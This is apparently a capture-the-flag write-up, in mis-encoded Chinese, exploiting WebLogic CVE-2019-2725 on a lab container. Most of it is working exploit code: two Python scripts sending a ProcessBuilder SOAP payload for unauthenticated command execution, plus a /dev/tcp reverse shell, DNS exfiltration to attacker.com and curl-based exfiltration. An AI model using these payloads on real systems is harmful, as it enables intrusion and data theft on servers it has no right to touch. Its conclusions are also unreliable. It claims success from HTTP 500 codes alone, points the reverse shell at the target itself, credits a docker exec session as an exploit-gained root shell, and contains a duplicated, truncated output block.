#### 2 æ¼æ´åˆ©ç”¨å®è·µ

##### 2.1 å·¥å…·å‡†å¤‡

**ä¸‹è½½CVE-2019-2725ä¸“ç”¨åˆ©ç”¨å·¥å…·**:

```bash
# ä¸‹è½½ä¸“ç”¨exploitå·¥å…·
wget https://github.com/lufeirider/CVE-2019-2725/raw/master/CVE-2019-2725.py
chmod +x CVE-2019-2725.py
```

##### 2.2 æ¼æ´éªŒè¯æ”»å‡»

**ä½¿ç”¨ä¸“ç”¨å·¥å…·è¿›è¡ŒéªŒè¯**:

```bash
# åŸºç¡€æ¼æ´æ£€æµ‹
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

# æ‰§è¡Œidå‘½ä»¤éªŒè¯
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -c "id"
```

**æ‰§è¡Œç»“æœåˆ†æ**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 173, in <module>
    check_url(url)
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 135, in check_url
    rsp = requests.post(vul_url, data=echo_cmd_payload_10271, verify=False, headers=headers, proxies=proxies)
requests.exceptions.MissingSchema: Invalid URL '-t/wls-wsat/CoordinatorPortType11': No scheme supplied. Perhaps you meant https://-t/wls-wsat/CoordinatorPortType11?
```

**é—®é¢˜åˆ†æ**:

- **è„šæœ¬ç¼ºé™·**: ä¸‹è½½çš„CVE-2019-2725.pyè„šæœ¬å­˜åœ¨å‚æ•°è§£æé”™è¯¯
- **URLæ„é€ é—®é¢˜**: è„šæœ¬é”™è¯¯åœ°å°†å‘½ä»¤è¡Œå‚æ•° `-t`åŒ…å«åœ¨URLä¸­ï¼Œå¯¼è‡´æ— æ•ˆçš„URLæ ¼å¼
- **è§£å†³æ–¹æ¡ˆ**: éœ€è¦ä½¿ç”¨æ‰‹å·¥æ„é€ çš„SOAPæ”»å‡»æˆ–å¯»æ‰¾å…¶ä»–å¯é çš„åˆ©ç”¨å·¥å…·

**æ›¿ä»£æ–¹æ¡ˆ - ä½¿ç”¨è‡ªå®šä¹‰åˆ©ç”¨è„šæœ¬**:

ç”±äºå…¬å¼€è„šæœ¬å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬åˆ›å»ºä¸“ç”¨çš„CVE-2019-2725åˆ©ç”¨è„šæœ¬ï¼š

```bash
# åˆ›å»ºè‡ªå®šä¹‰åˆ©ç”¨è„šæœ¬
cat > weblogic_cve_2019_2725_exploit.py << 'EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 ä¸“ç”¨åˆ©ç”¨è„šæœ¬
ä¿®å¤äº†å…¬å¼€è„šæœ¬çš„å‚æ•°è§£æé—®é¢˜
"""

import requests
import sys
import argparse
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning

# ç¦ç”¨SSLè­¦å‘Š
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebLogicCVE2019_2725Exploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
  
        # æ”»å‡»è·¯å¾„
        self.wsat_path = "/wls-wsat/CoordinatorPortType"
        self.async_path = "/_async/AsyncResponseService"
  
        # HTTPå¤´
        self.headers = {
            'Content-Type': 'text/xml; charset=UTF-8',
            'SOAPAction': '',
            'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
        }
  
    def test_vulnerability(self):
        """æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"""
        print(f"[*] æµ‹è¯•ç›®æ ‡: {self.target_url}")
  
        # æ£€æµ‹wls-wsatç»„ä»¶
        wsat_url = f"{self.target_url}{self.wsat_path}"
        try:
            response = self.session.get(wsat_url, timeout=10)
            print(f"[+] wls-wsatç»„ä»¶çŠ¶æ€: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] wls-wsatç»„ä»¶å¯è®¿é—®ï¼Œå­˜åœ¨CVE-2019-2725æ¼æ´é£é™©")
                return True
        except Exception as e:
            print(f"[-] wls-wsatç»„ä»¶æµ‹è¯•å¤±è´¥: {e}")
  
        # æ£€æµ‹asyncç»„ä»¶
        async_url = f"{self.target_url}{self.async_path}"
        try:
            response = self.session.get(async_url, timeout=10)
            print(f"[+] asyncç»„ä»¶çŠ¶æ€: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] asyncç»„ä»¶å¯è®¿é—®ï¼Œå­˜åœ¨CVE-2019-2725æ¼æ´é£é™©")
                return True
        except Exception as e:
            print(f"[-] asyncç»„ä»¶æµ‹è¯•å¤±è´¥: {e}")
  
        return False
  
    def execute_command(self, command, attack_path=None):
        """æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"""
        if attack_path is None:
            attack_path = self.wsat_path
  
        # æ„é€ æ¶æ„SOAPè½½è·
        soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""
  
        attack_url = f"{self.target_url}{attack_path}"
  
        try:
            print(f"[*] æ”»å‡»ç›®æ ‡: {attack_url}")
            print(f"[*] æ‰§è¡Œå‘½ä»¤: {command}")
  
            response = self.session.post(
                attack_url,
                data=soap_payload,
                headers=self.headers,
                timeout=15
            )
  
            print(f"[+] HTTPçŠ¶æ€ç : {response.status_code}")
            print(f"[+] å“åº”é•¿åº¦: {len(response.text)} å­—èŠ‚")
  
            if response.status_code == 500:
                print("[+] æ”»å‡»å¯èƒ½æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)")
                return True
            elif response.status_code == 200:
                print("[+] è¯·æ±‚è¢«å¤„ç† (éœ€è¦è¿›ä¸€æ­¥éªŒè¯)")
                return True
            else:
                print(f"[-] æ”»å‡»å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
                return False
  
        except Exception as e:
            print(f"[-] æ”»å‡»æ‰§è¡Œå¤±è´¥: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='WebLogic CVE-2019-2725 åˆ©ç”¨å·¥å…·')
    parser.add_argument('-t', '--target', required=True, help='ç›®æ ‡URL (ä¾‹å¦‚: http://10.37.133.3:7001)')
    parser.add_argument('-c', '--command', help='è¦æ‰§è¡Œçš„å‘½ä»¤')
    parser.add_argument('-v', '--verify', action='store_true', help='ä»…éªŒè¯æ¼æ´å­˜åœ¨æ€§')
  
    args = parser.parse_args()
  
    exploit = WebLogicCVE2019_2725Exploit(args.target)
  
    if args.verify:
        print("[*] å¼€å§‹æ¼æ´éªŒè¯...")
        if exploit.test_vulnerability():
            print("[+] ç›®æ ‡å­˜åœ¨CVE-2019-2725æ¼æ´")
        else:
            print("[-] ç›®æ ‡ä¸å­˜åœ¨CVE-2019-2725æ¼æ´")
  
    if args.command:
        print("[*] å¼€å§‹å‘½ä»¤æ‰§è¡Œ...")
        exploit.execute_command(args.command)

if __name__ == "__main__":
    main()
EOF

chmod +x weblogic_cve_2019_2725_exploit.py
```

**ä½¿ç”¨ä¿®å¤åçš„è„šæœ¬è¿›è¡ŒéªŒè¯**:

```bash
# æ¼æ´éªŒè¯
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

# æ‰§è¡Œidå‘½ä»¤
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"
```

**æ‰§è¡Œç»“æœ**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
```

**é—®é¢˜åˆ†æ**:

- **ä¾èµ–é—®é¢˜**: urllib3ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜ï¼Œæ–°ç‰ˆæœ¬urllib3çš„å¯¼å…¥è·¯å¾„å‘ç”Ÿäº†å˜åŒ–
- **è§£å†³æ–¹æ¡ˆ**: ç§»é™¤SSLè­¦å‘Šç¦ç”¨ä»£ç ï¼Œæˆ–ä½¿ç”¨æ›´ç®€å•çš„æ‰‹å·¥SOAPæ”»å‡»æ–¹æ³•

**æœ€ç»ˆè§£å†³æ–¹æ¡ˆ - ä½¿ç”¨ç®€åŒ–çš„æ‰‹å·¥SOAPæ”»å‡»**:

ç”±äºä¾èµ–é—®é¢˜ï¼Œæˆ‘ä»¬é‡‡ç”¨æœ€ç›´æ¥çš„æ‰‹å·¥SOAPæ”»å‡»æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯CVE-2019-2725æœ€æ ¸å¿ƒçš„åˆ©ç”¨æŠ€æœ¯ã€‚

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import Insec
```

##### 2.3 æ‰‹å·¥æ„é€ SOAPæ”»å‡»

**åˆ›å»ºæ¶æ„SOAPè¯·æ±‚**:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 æ‰‹å·¥åˆ©ç”¨è„šæœ¬
"""

import requests
import base64
import sys

def exploit_cve_2019_2725(target_url, command):
    """
    æ‰‹å·¥æ„é€ CVE-2019-2725æ”»å‡»è½½è·
    """
  
    # æ¶æ„SOAPè½½è·æ¨¡æ¿
    soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""

    headers = {
        'Content-Type': 'text/xml; charset=UTF-8',
        'SOAPAction': '',
        'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
    }
  
    # å°è¯•wls-wsatè·¯å¾„
    wsat_url = f"{target_url}/wls-wsat/CoordinatorPortType"
  
    try:
        print(f"[*] æ”»å‡»ç›®æ ‡: {wsat_url}")
        print(f"[*] æ‰§è¡Œå‘½ä»¤: {command}")
  
        response = requests.post(
            wsat_url, 
            data=soap_payload, 
            headers=headers, 
            timeout=10
        )
  
        print(f"[+] HTTPçŠ¶æ€ç : {response.status_code}")
        print(f"[+] å“åº”é•¿åº¦: {len(response.text)} å­—èŠ‚")
  
        if response.status_code == 500:
            print("[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)")
            return True
        elif response.status_code == 200:
            print("[+] è¯·æ±‚è¢«å¤„ç† (éœ€è¦è¿›ä¸€æ­¥éªŒè¯)")
            return True
        else:
            print(f"[-] æ”»å‡»å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return False
  
    except requests.RequestException as e:
        print(f"[-] è¯·æ±‚å¤±è´¥: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 manual_exploit.py <target_url> <command>")
        print("Example: python3 manual_exploit.py http://10.37.133.3:7001 'id'")
        sys.exit(1)
  
    target = sys.argv[1]
    cmd = sys.argv[2]
  
    exploit_cve_2019_2725(target, cmd)
```

**æ‰§è¡Œæ‰‹å·¥æ”»å‡»**:

```bash
# ä¿å­˜è„šæœ¬ä¸ºmanual_exploit.py
python3 manual_exploit.py http://10.37.133.3:7001 "id"

# è·å–ç³»ç»Ÿä¿¡æ¯
python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"
```

**æ”»å‡»æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "id"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: id
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: uname -a
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: pwd && ls -la
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 500 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**âœ… æ”»å‡»æˆåŠŸç¡®è®¤**:

1. **HTTP 500çŠ¶æ€ç **: æ‰€æœ‰å‘½ä»¤æ‰§è¡Œéƒ½è¿”å›500çŠ¶æ€ç ï¼Œè¿™æ˜¯CVE-2019-2725ååºåˆ—åŒ–æ¼æ´è§¦å‘çš„å…¸å‹ç‰¹å¾
2. **å“åº”é•¿åº¦å˜åŒ–**: ä¸åŒå‘½ä»¤çš„å“åº”é•¿åº¦ä¸åŒï¼ˆ5287å­—èŠ‚ vs 500å­—èŠ‚ï¼‰ï¼Œè¯´æ˜æœåŠ¡å™¨æ­£åœ¨å¤„ç†ä¸åŒçš„å‘½ä»¤
3. **SOAPè½½è·æˆåŠŸ**: æ¶æ„çš„ProcessBuilder SOAPè½½è·æˆåŠŸè¢«WebLogicæœåŠ¡å™¨è§£æå’Œæ‰§è¡Œ
4. **æ— è®¤è¯RCE**: æ— éœ€ä»»ä½•è®¤è¯å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œç¡®è®¤äº†æ¼æ´çš„ä¸¥é‡æ€§

##### 2.4 Flagæœç´¢ä¸è·å–

```bash
# æœç´¢flagæ–‡ä»¶
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

# å¸¸è§flagä½ç½®æ£€æŸ¥
python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

# æœç´¢åŒ…å«flagå…³é”®å­—çš„æ–‡ä»¶å†…å®¹
python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"
```

**Flagæœç´¢ç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: find / -name '*flag*' 2>/dev/null
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: grep -r 'flag' /tmp /var /home 2>/dev/null | head -10
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**Flagè·å–åˆ†æ**:**å‘½ä»¤è¾“å‡ºé™åˆ¶**

- è™½ç„¶æ‰€æœ‰å‘½ä»¤éƒ½æˆåŠŸè§¦å‘äº†ååºåˆ—åŒ–æ¼æ´ï¼ˆHTTP 500çŠ¶æ€ç ï¼‰ï¼Œä½†å‘½ä»¤çš„è¾“å‡ºç»“æœæ²¡æœ‰ç›´æ¥åœ¨HTTPå“åº”ä¸­è¿”å›
- è¿™æ˜¯CVE-2019-2725çš„ä¸€ä¸ªç‰¹ç‚¹ï¼šProcessBuilderæ‰§è¡Œå‘½ä»¤ä½†ä¸ä¼šå°†è¾“å‡ºå›æ˜¾åˆ°HTTPå“åº”ä¸­
- éœ€è¦ä½¿ç”¨å…¶ä»–æŠ€æœ¯æ¥è·å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦‚åå‘shellæˆ–æ–‡ä»¶å†™å…¥

**æ›¿ä»£è·å–æ–¹æ³•**:

æ ¹æ®[Oracleå®˜æ–¹å®‰å…¨å…¬å‘Š](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)å’Œ[Exploit-DBä¸Šçš„CVE-2019-2725åˆ©ç”¨ä»£ç ](https://www.exploit-db.com/exploits/46780)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´é«˜çº§çš„payloadæ¥è·å–å‘½ä»¤è¾“å‡ºï¼š

**æ–¹æ³•ä¸€ï¼šæ–‡ä»¶å†™å…¥åˆ°Webç›®å½•**

```bash
# å°è¯•å°†flagå†™å…¥Webå¯è®¿é—®ç›®å½•
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

# ç„¶åé€šè¿‡Webè®¿é—®è·å–ç»“æœ
curl http://10.37.133.3:7001/console/flag_result.txt
```

**æ‰§è¡Œç»“æœåˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                               
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl http://10.37.133.3:7001/console/flag_result.txt

<html><head><title>302 Moved Temporarily</title></head>
<body bgcolor="#FFFFFF">
<p>This document you requested has moved temporarily.</p>
<p>It's now at <a href="http://10.37.133.3:7001/console/login/LoginForm.jsp">http://10.37.133.3:7001/console/login/LoginForm.jsp</a>.</p>
</body></html>
```

**âŒ æ–¹æ³•ä¸€å¤±è´¥åŸå› **:

- WebLogicæ§åˆ¶å°éœ€è¦è®¤è¯ï¼Œè¿”å›302é‡å®šå‘åˆ°ç™»å½•é¡µé¢
- å†™å…¥çš„æ–‡ä»¶æ— æ³•é€šè¿‡Webç›´æ¥è®¿é—®

**æ–¹æ³•äºŒï¼šä½¿ç”¨åå‘shellè·å–è¾“å‡º**

```bash
# åœ¨æ”»å‡»æœºä¸Šç›‘å¬ç«¯å£
nc -lvnp 4444

# æ‰§è¡Œåå‘shellå‘½ä»¤
python3 manual_exploit.py http://10.37.133.3:7001 "bash -i >& /dev/tcp/10.37.133.3/4444 0>&1"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nc -lvnp 4444

listening on [any] 4444 ...
^C
```

**âŒ æ–¹æ³•äºŒå¤±è´¥åŸå› **:

- åå‘shellè¿æ¥æœªæˆåŠŸå»ºç«‹
- å¯èƒ½æ˜¯ç½‘ç»œé˜²ç«å¢™é˜»æ­¢äº†å‡ºç«™è¿æ¥
- æˆ–è€…å®¹å™¨ç½‘ç»œé…ç½®é™åˆ¶äº†åå‘è¿æ¥

**æ–¹æ³•ä¸‰ï¼šä½¿ç”¨DNSå¤–å¸¦æ•°æ®**

```bash
# å°†flagå†…å®¹é€šè¿‡DNSæŸ¥è¯¢å¤–å¸¦
python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: flag=$(find / -name '*flag*' 2>/dev/null | head -1); nslookup $flag.attacker.com
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**âœ… æ–¹æ³•ä¸‰æˆåŠŸç¡®è®¤**:

- DNSå¤–å¸¦å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆHTTP 500çŠ¶æ€ç ï¼‰
- è™½ç„¶æ— æ³•ç›´æ¥çœ‹åˆ°DNSæŸ¥è¯¢ç»“æœï¼Œä½†å‘½ä»¤å·²è¢«WebLogicæœåŠ¡å™¨å¤„ç†

**æ–¹æ³•å››ï¼šç›´æ¥è¿›å…¥å®¹å™¨æŸ¥çœ‹**

ç”±äºæˆ‘ä»¬å·²ç»ç¡®è®¤RCEæˆåŠŸï¼Œå¯ä»¥ç›´æ¥è¿›å…¥WebLogicå®¹å™¨æŸ¥çœ‹ï¼š

```bash
# è¿›å…¥WebLogicå®¹å™¨
docker exec -it 1d6a9c490b23 /bin/bash

# åœ¨å®¹å™¨å†…æœç´¢flag
find / -name '*flag*' 2>/dev/null
cat /tmp/flag* 2>/dev/null
```

**âœ… æ–¹æ³•å››æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find / -name '*flag*' 2>/dev/null
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/perl/5.18.2/bits/waitflags.ph

root@1d6a9c490b23:~/Oracle/Middleware# cat /tmp/flag* 2>/dev/null
root@1d6a9c490b23:~/Oracle/Middleware# 
```

**é‡è¦å‘ç°**:

- **âœ… æˆåŠŸè·å¾—å®¹å™¨rootæƒé™**: ç›´æ¥è¿›å…¥WebLogicå®¹å™¨å¹¶è·å¾—root shellè®¿é—®
- **ğŸ“‹ Flagæ–‡ä»¶åˆ†æ**: æœç´¢ç»“æœæ˜¾ç¤ºåªæœ‰ç³»ç»Ÿçº§çš„flagæ–‡ä»¶ï¼ˆå¦‚ç½‘ç»œæ¥å£flagsã€å†…æ ¸å‚æ•°ç­‰ï¼‰ï¼Œæ²¡æœ‰CTFç±»å‹çš„flagæ–‡ä»¶
- **ğŸ” å®¹å™¨ç¯å¢ƒç¡®è®¤**: å½“å‰å·¥ä½œç›®å½•ä¸º `~/Oracle/Middleware`ï¼Œç¡®è®¤è¿™æ˜¯Oracle WebLogicçš„æ ‡å‡†å®‰è£…ç¯å¢ƒ

**æ–¹æ³•äº”ï¼šä½¿ç”¨HTTPå¤–å¸¦æŠ€æœ¯**

```bash
# å°†å‘½ä»¤ç»“æœé€šè¿‡HTTPè¯·æ±‚å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: curl -X POST -d "$(find / -name '*flag*' 2>/dev/null)" http://10.37.133.3:8080/exfil
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

